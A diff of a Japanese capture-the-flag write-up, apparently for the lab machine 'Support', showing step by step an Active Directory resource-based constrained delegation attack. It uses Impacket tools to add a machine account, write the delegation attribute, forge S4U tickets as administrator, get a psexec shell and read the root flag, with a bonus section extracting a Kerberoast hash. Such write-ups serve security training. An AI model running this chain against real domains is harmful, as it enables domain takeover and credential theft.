@@ -150,8 +150,8 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Successfully added machine account kali$ with password Ironside47pleasure40Watchful.
 ```
-ターゲットのマシンアカウントの`msDS-AllowedToActOnBehalfOfOtherIdentity`属性に作成したマシンアカウントを追加  
-これにてdc$の権限がkali$に委任されるようになる
+ターゲットのマシンアカウントの`msDS-AllowedToActOnBehalfOfOtherIdentity`属性に作成マシンアカウントを追加  
+これにより、作成マシンアカウントの委任の権限がdc$に対してのみ許可されるようになった
 ```sh
 └─$ impacket-rbcd -delegate-to 'dc$' -delegate-from 'kali$' -action 'write' -ts -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -168,7 +168,8 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [2025-11-07 07:26:58] [*] Accounts allowed to act on behalf of other identity:
 [2025-11-07 07:26:58] [*]     kali$        (S-1-5-21-1677581083-3380853377-188903654-6101)
 ```
-kali$の権限で、dcのcifsにadministratorとしてアクセスするtgsを取得できた
+s4u2selfを使用して、作成マシンアカウントに対するtgsをパスワードなしでadministrator権限で作成  
+s4u2proxyを使用して、s4u2selfで取得したtgsを送信した後にdc$のcifsに対するtgsを取得  
 ```sh
 └─$ impacket-getST -spn 'cifs/dc.support.htb' -impersonate administrator -ts -dc-ip 10.129.230.181 'support/kali$:Ironside47pleasure40Watchful'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -203,6 +204,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
 [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
 ```
+取得したtgsを使用してpsexec、ルートフラグゲット
 ```sh
 └─$ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
 
@@ -221,4 +223,98 @@ Microsoft Windows [Version 10.0.20348.859]
 
 C:\Windows\system32> type c:\users\administrator\desktop\root.txt
 f006b3f9a0397b6fed86ed2e083026d1
+```
+おまけ  
+s4u2selfのみで、作成マシンアカウントのtgsを取得した場合
+```sh
+└─$ impacket-getST -impersonate administrator -ts -self -dc-ip 10.129.230.181 'support/kali$:Ironside47pleasure40Watchful'                                            
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-11-08 09:50:46] [-] CCache file is not found. Skipping...
+[2025-11-08 09:50:46] [*] Getting TGT for user
+[2025-11-08 09:50:48] [*] Impersonating administrator
+[2025-11-08 09:50:48] [*] Requesting S4U2self
+[2025-11-08 09:50:50] [*] Saving ticket in administrator@kali$@SUPPORT.HTB.ccache
+                                                                                                                                                                       
+└─$ python3.13 -c "import hashlib; print(hashlib.new('md4', 'Ironside47pleasure40Watchful'.encode('utf-16le')).hexdigest())"                                         
+11fbaef07d83e3f6cde9f0ff98a3af3d
+                                                                                                                                                                       
+└─$ impacket-describeTicket --rc4 11fbaef07d83e3f6cde9f0ff98a3af3d administrator@kali\$@SUPPORT.HTB.ccache                                                           
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : b4b64f660316b96a71f9082a17cc00da
+[*] User Name                     : administrator
+[*] User Realm                    : support
+[*] Service Name                  : kali$
+[*] Service Realm                 : SUPPORT.HTB
+[*] Start Time                    : 08/11/2025 09:50:49 AM
+[*] End Time                      : 08/11/2025 19:50:48 PM
+[*] RenewTill                     : 09/11/2025 09:50:47 AM
+[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : tLZPZgMWuWpx+QgqF8wA2g==
+[*] Kerberoast hash               : $krb5tgs$23$*USER$SUPPORT.HTB$kali$*$e92fd03378aab7eb199297f6cf8efb7b$a4a2bdd08247cf7e71461bc8a112a156af8f6b062a0f2c996089211cc676b060ba5d516d2d02cba94fc939c81d1f143370a513fbfcf510159843543608a2df9f5212fcf23f32a28ff075e29f4b09f5175e0ff556324d44767b1ea78edd7a9eeeea03d55dc8b99fd2f30232e42be6f426a1d1468ed997554b1df35c90954935ee53c55aa796411661d6103f5f68ccb6a767a5e5fa5cce83c28000f64f3085c549c52115b9350ce6f38f73968f4dd1c5ee642339cac719e309e3e769e596833d5527c80072632a90d002298627bb23a5ef30801c6c4c9ba2cf7a76ec23ae7820b7f63d542773d6a345d93a93caa235095e6e167ec94a3ec99eb2253bde44a03da677efd618fe6e7d8ae38a91cb3f9c8850206aed3d91599ac6a28d8e06e4f24a20692538291ac4d9606e09ef772c1e82f9de49acc5dc66cc1dcabb313136cf0e269d5757212d90aaf143261713896182ef014afe4e3fc8e8fdc0ca49dd102b6f618c1979b723f9f0e63d34f1a755bc0b770ef94fd9c4ce936966d0bbe6cb4d63a4d83c6e330f152cbc3075b0c409d782dad17014b2d7d60775dccfc503056725f2e27ad61114eb7e986e040dc971754c00035d5f8e00bcbc585439c929c15f117c014be483ec86cf4320e2432638781c45e4a3cb37a38f4d6647895b133654e25dbea460dfc1c2dfccfc25e2a8a5d4d6e9967486edc47963244a2ffe97ca72280166e2e7ce463148e340108244491c69ed9a24502cf45eea08229c75f508e0307850452ba79c4f25d671d7f8d8347fd211077055e54bb3cf05c5739f76c4045e389ebc82dc60802a62ac19449af87d48e4e30221659c45588474f9ba1979e4eab7a46d2084ffb31d6b4bf541da6fbf773224e34e56333fc75febe098965f16db68b1042d88c0c66298574de57f4f1716c938f0b27fb201d6238aa8d7adefa76e492e25d034450fe44bcce7257306d375e558b089bbb385843983b33f5696bed829faa50fbda3454a8b469c43cafbef28a59ded60affe88f95beec9c99159ef4405781f7123b3b889e11bd395942b2b06dfd4d2e3227dc76f58632e6811fe61be431e6157df785abc0d62e14d15aca4f29401243028f0119dcdb473a57a3a8478e2d53c4fffe2f035c5338054bd105320a71b7b2d10ece61fe15aa7d80e04843e08b6d39b2fe13c73e4f8c997230518e07e24522842e005be9d298bafb06540ca2e325e9812c861bbbbecab77b44dc4cbbd2a14d1cacdffff319420e460bd27d791976e627fd818293d0356016be68f37396e0174b614e26d636498a81eac9f933238899d1e5786ca90ee8907a4ea08f5ffdfe87835e844ad9d98c1eedade6699604bc1cbc0a49fff1015004b1450c85f689ae5b9eccf1be4f6d3a81c86a318c4f584bb17b5637daca46d24a5e5c90be22eee1c473e33c7f2a9ef047220b285371768f95208ac972ad430dc70cd6702898e3863413a8732e7e63d48e088c58090953acbc7e1d7155f478cb4f56c002a1b82526323b8355834bad9c67bf314bd19d84ac8752ff00376fe19bb6c8c7b512257fe0710696a563f2d4cc520ac41
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : kali$
+[*]   Service Realm               : SUPPORT.HTB
+[*]   Encryption type             : rc4_hmac (etype 23)
+[*] Decoding credential[0]['ticket']['enc-part']:
+[*]   LoginInfo                   
+[*]     Logon Time                : 08/11/2025 11:53:45 AM
+[*]     Logoff Time               : Infinity (absolute time)
+[*]     Kickoff Time              : Infinity (absolute time)
+[*]     Password Last Set         : 19/07/2022 17:55:56 PM
+[*]     Password Can Change       : 20/07/2022 17:55:56 PM
+[*]     Password Must Change      : Infinity (absolute time)
+[*]     LastSuccessfulILogon      : Infinity (absolute time)
+[*]     LastFailedILogon          : Infinity (absolute time)
+[*]     FailedILogonCount         : 0
+[*]     Account Name              : Administrator
+[*]     Full Name                 : 
+[*]     Logon Script              : 
+[*]     Profile Path              : 
+[*]     Home Dir                  : 
+[*]     Dir Drive                 : 
+[*]     Logon Count               : 73
+[*]     Bad Password Count        : 0
+[*]     User RID                  : 500
+[*]     Group RID                 : 513
+[*]     Group Count               : 5
+[*]     Groups                    : 512, 520, 513, 519, 518
+[*]     Groups (decoded)          : (512) Domain Admins
+[*]                                 (520) Group Policy Creator Owners
+[*]                                 (513) Domain Users
+[*]                                 (519) Enterprise Admins
+[*]                                 (518) Schema Admins
+[*]     User Flags                : (544) LOGON_EXTRA_SIDS, LOGON_RESOURCE_GROUPS
+[*]     User Session Key          : 00000000000000000000000000000000
+[*]     Logon Server              : DC
+[*]     Logon Domain Name         : SUPPORT
+[*]     Logon Domain SID          : S-1-5-21-1677581083-3380853377-188903654
+[*]     User Account Control      : (16) USER_NORMAL_ACCOUNT
+[*]     Extra SID Count           : 1
+[*]     Extra SIDs                : S-1-18-2 Service asserted identity (SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED)
+[*]     Resource Group Domain SID : S-1-5-21-1677581083-3380853377-188903654
+[*]     Resource Group Count      : 1
+[*]     Resource Group Ids        : 572
+[*]     LMKey                     : 0000000000000000
+[*]     SubAuthStatus             : 0
+[*]     Reserved3                 : 0
+[*]   ClientName                  
+[*]     Client Id                 : 08/11/2025 14:50:48 PM
+[*]     Client Name               : administrator
+[*]   UpnDns                      
+[*]     Flags                     : (3) U_UsernameOnly, S_SidSamSupplied
+[*]     UPN                       : Administrator@support.htb
+[*]     DNS Domain Name           : SUPPORT.HTB
+[*]     SamAccountName            : Administrator
+[*]     UserSid                   : S-1-5-21-1677581083-3380853377-188903654-500
+[*]   ServerChecksum              
+[*]     Signature Type            : hmac_md5
+[*]     Signature                 : 46ea0b8b0a6d53d8d38435eaa9d223d9
+[*]   KDCChecksum                 
+[*]     Signature Type            : hmac_sha1_96_aes256
+[*]     Signature                 : d9ef2528a21cdd2446b31f62
 ```
